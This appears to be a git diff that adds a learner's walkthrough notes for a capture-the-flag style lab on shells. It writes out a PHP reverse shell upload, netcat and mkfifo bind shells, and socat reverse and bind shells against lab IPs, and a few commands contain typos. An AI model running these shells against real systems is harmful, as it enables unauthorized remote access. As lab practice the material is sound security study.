@@ -881,7 +881,7 @@ net localgroup administrators <username> /add
 
 ---
 
-Task 13  Practice and Examples
+Task 13  Practice and Examples - 1:00 - With Task 14 and 15 Parctice Boxes
 ---
 This room contained a lot of information, and gave you little opportunity to put it into practice throughout. 
 
@@ -905,11 +905,112 @@ to send a reverse shell back to a waiting listener on your own machine.
 2. Navigate to ```/usr/share/webshells/php/php-reverse-shell.php``` in Kali and ```change the IP and port``` to match your ```tun0 IP with a custom port```. 
 Set up a ```netcat listener```, then ```upload and activate the shell```.
 
+For Question 1 and 2:
+Step 1 - start the Linux box in Task 13 
+Step 2 - On Terminal, nagivate to /usr/share/webshells/php/ and locate the php-reverse-shell.php
+step 3 - cp the file to /desktop
+
+Step 4 - edit the file and change the IP to the Attack Box IP not the target machine
+![img](/assets/img/wts18.png)
+
+Step 5 - On the terminal, setup the reverse shell back to your ```Attackbox``` (waiting listener)
+![img](/assets/img/wts19.png) 
+
+Step 6 - Open Firefox with the Target IP, the page has the interface to Upload the php-reverse-shell.php file to the Target.
+![img](/assets/img/wts20.png)
+
+Step 7 - Click the link from the upload page and change address field of the browser to the "uploads" directory. Then click the reverse shell php file. 
+
+Step 8 - The terminal will now connected and listensing the Target
+
+Step 9 - To setup the connection on Question 1.  listensing from Attacker box via nc ```<Local-IP>``` ```<Port>```" -e /bin/bash"
+Open the terminal, as follow:
+```
+nc -lvnp 1024
+```
+![img](/assets/img/wts21.png)
+
+Step 10 - successfully completed 2 reverse shells for Q1 and Q2
+
+---
 
 3. Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.
 
+Step 1 - ssh on AttackBox terminal using the credential from Task 13
+```
+ssh shell@10.10.8.56
+```
+Step 2 - bind and revese shell techniques from Task 8
+For bind shell
+- Option 1: 
+```
+nc -lvnp <PORT> -e /bin/bash
+```
+
+- Option 2: Using Pipes
+```
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f
+```
+```
+mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f
+```
+
+![img](/assets/img/wts23.png)
+
+Step 3 - open another terminal from Attack box to Target using nc command below
+```
+nc 10.10.8.56 8080
+```
+![img](/assets/img/wts24.png)
+
+Step 4 -  Testing the connection as below
+
+![img](/assets/img/wts25.png)
+
+---
+
 
 4. Practice ```reverse and bind shells``` using ```Socat on the Linux machine```. Try both the ```normal and special``` techniques.
+
+### Reverse Shell using SSH session and socat listener and socat reverse shell commands
+---
+
+Step 1 - Setup the listener from the ATTACK Box terminal using port 1234
+```
+socat TCP-L:1234 -
+```
+![img](/assets/img/wts26.png)
+
+After you can type any command on the Listener terminal on the Attackbox and the SSH terminal will have the same command running.
+
+Step 2 - SSH to TARGET 
+
+Step 3 - use socat revese shell command from Task 6 
+```
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -Li"
+socat TCP:10.10.8.56:1234 EXEC:"bash -Li"
+```
+Step 4 - run the commands from the Attacker Listener terminal
+```
+whoami
+ls
+```
+![img](/assets/img/wts27.png) 
+
+1:17:51
+### Bind Shell using SSH session and socat listener and socat reverse shell commands
+---
+Step 1 - Use socat bind shells listener command in Task 6 on ATTACKer Terminal
+```
+socat TCP-L:443 EXEC : EXEC:"bash -li"
+```
+Step 2 - Use socat bind shells command on the Attacker Terminal 
+```
+socat TCP:10.10.8.56:1023 -
+```
+
+
+
 
 
 5. Look through [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques. Try to analyse them and see why they work.
